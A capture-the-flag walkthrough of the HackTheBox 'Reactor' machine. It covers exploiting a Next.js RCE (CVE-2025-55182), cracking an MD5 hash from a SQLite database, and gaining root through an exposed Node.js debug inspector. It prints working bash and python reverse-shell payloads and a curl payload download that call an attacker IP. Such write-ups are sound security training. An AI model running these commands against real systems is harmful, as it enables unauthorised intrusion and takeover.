HTB: Reactor

CTF
// Contents

    Difficulty: Easy  |  OS: Linux
    Box: app.hackthebox.com/machines/Reactor

    Overview

    Reactor is an easy Linux box themed around a fictional nuclear reactor monitoring dashboard, "ReactorWatch." The path to root runs through a recently disclosed unauthenticated RCE in a Next.js/React application (CVE-2025-55182, "React2Shell"), credential recovery from a local SQLite database, and privilege escalation via an exposed Node.js debug inspector running as root.

    Reconnaissance

    Started with a standard TCP port scan:

    nmap -Pn -n -sS -T4 10.129.245.214 --open
    PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

    Only two ports open: SSH (22) and something on 3000 that nmap's default service signatures misidentified as ppp. Followed up with a version/script scan against both: 

    nmap -Pn -sV -sC -p 22,3000 10.129.245.214
    22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, ...

    Web Enumeration

    Pulling up http://10.129.245.214:3000/ in a browser revealed a dark-themed monitoring dashboard:

    The page title and meta description confirmed the theme:

    Title: ReactorWatch | Core Monitoring System
Description: Nuclear Reactor Core Monitoring Dashboard

    The UI itself was entirely read-only — no clickable links, no forms, no other reachable pages from the dashboard alone. Just live(ish) visualizations of reactor stats, system logs, and on-site personnel. Response headers were unremarkable — no leaked internal hostnames, no debug headers, nothing unusual.

    Fingerprinting the stack with whatweb confirmed the framework and version: 

    whatweb http://10.129.245.214:3000/
    http://10.129.245.214:3000/ [200 OK] HTML5, Script,
Title[ReactorWatch | Core Monitoring System],
UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time],
X-Powered-By[Next.js]

    The rendered page source also leaked an internal version string:

    <span>CORE MONITORING SYSTEM v3.2.1</span>

    Exploitation — CVE-2025-55182 (React2Shell)

    With Next.js confirmed, a quick search for recent React/Next.js vulnerabilities turned up CVE-2025-55182, an unauthenticated RCE affecting React Server Components, publicly nicknamed "React2Shell." A public PoC and scanner were available on GitHub.

    Ran the scanner against the target:

    python3 scanner.py -u http://10.129.33.66:3000
    [*] Using RCE PoC check
[VULNERABLE] http://10.129.33.66:3000 - Status: 303

    Confirmed vulnerable. The default PoC targeted port 443 — had to adjust the script to target port 3000 instead before it would work correctly against this host.

    Once patched up, confirmed code execution:

    python3 main.py http://10.129.33.66:3000 'id'
    [+] Command output:
uid=999(node) gid=988(node) groups=988(node)

    Unauthenticated RCE confirmed, running as the low-privileged node user.

    Gaining a Stable Shell

    The PoC's command execution worked but was single-shot — every command was a fresh, non-interactive request/response. Various reverse shell one-liners (via revshells.com) failed to connect back directly through this execution method.

    Worked around it by staging a payload file via HTTP and pulling it down with curl:

    1. Hosted a payload locally:

    python3 -m http.server 8000

    payload.sh:

    #!/bin/bash
bash -i >& /dev/tcp/10.10.14.117/9005 0>&1

    2. Pulled it onto the target via the RCE:

    curl http://10.10.14.117:8000/payload.sh -o /opt/reactor-app/payload.sh
chmod +x payload.sh

    3. Started a listener and triggered execution:

    nc -lvnp 9005
    ./payload.sh
    connect to [10.10.14.117] from (UNKNOWN) [10.129.33.66] 39590
bash: cannot set terminal process group (1392): Inappropriate ioctl for device
bash: no job control in this shell
node@reactor:/opt/reactor-app$

    Interactive(ish) shell as node established.

    Credential Discovery

    Inside the application directory sat a SQLite database:

    node@reactor:/opt/reactor-app$ ls
app  next.config.js  node_modules  package.json  package-lock.json  payload.sh  reactor.db
    file reactor.db
reactor.db: SQLite 3.x database, last written using SQLite version 3045001, ...

    Two user home directories existed on the box (/home/engineer, /home/node), so finding credentials here was promising. Opened it up: 

    sqlite3 reactor.db
sqlite> .tables
sensor_logs  users
sqlite> SELECT * FROM users;
    1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb

    Two password hashes recovered. Identified the format with hashid — top match: MD5. Ran the engineer hash through CrackStation: 

    39d97110eafe2a9a68639812cd271e8e → reactor1

    Cracked credentials: engineer:reactor1.

    Privilege Escalation

    Started with the basics — current group memberships:

    id
    uid=1000(engineer) gid=1000(engineer)
groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)

    A few groups stood out:

    Group Relevance
    adm Read access to system logs in /var/log
    cdrom Optical media access — not relevant here
    dip Legacy dial-up/PPP group — not relevant here
    plugdev Removable media access — not relevant here
    lxd Known container-based privesc vector

    Dead end: LXD

    lxd group membership is a textbook privesc path (mount the host filesystem into a privileged container). However, on this box:

    • LXD/LXC was not actually installed — only a stub wrapper package (lxd-installer) that bootstraps the real thing via snap on first run.
    • The snap install failed outright — the box has no outbound internet access, so it couldn't reach the snap store.
    • sudo -l confirmed engineer has no sudo rights at all, ruling out a manual/sideloaded snap install too.

    This path was a dead end in this environment, despite being a legitimate technique in general. Worth remembering: group membership alone doesn't guarantee the tooling is actually present or usable.

    SUID / capabilities / cron — nothing notable

    Standard checks turned up nothing custom or exploitable:

    getcap -r / 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab

    All standard system binaries and default cron entries — no leads here.

    The real lead: exposed Node.js debug inspector

    Checked listening sockets:

    ss -tulpn
    tcp   LISTEN   0   511   127.0.0.1:9229   0.0.0.0:*

    Port 9229 is the default Node.js V8 Inspector debug port. A quick check of running processes confirmed who was listening on it: 

    ps -ef | grep node
    node   1392   1   0 20:18 ?   00:00:19 next-server (v15.0.3)
root   1394   1   0 20:18 ?   00:00:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

    A second, separate Node process (/opt/uptime-monitor/worker.js) was running as root, with the debug inspector explicitly bound to localhost. Since engineer already has local access to the box, this is directly reachable.

    Root via Node Inspector RCE

    The V8 Inspector protocol allows arbitrary JavaScript execution in the context of the attached process — meaning code run through it executes with that process's privileges (root, in this case).

    Connected to the inspector:

    node inspect 127.0.0.1:9229
    connecting to 127.0.0.1:9229 ... ok
debug>

    From the debug console, used child_process.exec() to spawn a reverse shell: 

    exec("process.mainModule.require('child_process').exec('python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.117\\\",8008));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\\'')")

    Caught the callback on a waiting listener:

    nc -lnvp 8008
    connect to [10.10.14.117] from (UNKNOWN) [10.129.33.66] 50448
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

    Root shell obtained. Root flag retrieved.

    Lessons Learned

    • Don't trust nmap's service-name guesses (ppp?) blindly — always confirm with a browser or manual probe.
    • Recently disclosed CVEs against modern frameworks (Next.js/React here) are worth checking against any unfamiliar app version found during recon, especially on freshly published boxes.
    • When a direct reverse shell payload won't connect back through a one-shot RCE primitive, staging via HTTP server + curl is a reliable fallback.
    • Group memberships (lxd, adm, etc.) are useful signal but not guaranteed wins — verify the actual tooling and permissions are present before sinking time into a path.
    • Always enumerate listening sockets, not just well-known ports. An internal-only debug port (9229) running as root was the real privesc path here — easy to miss if you only chase group memberships.
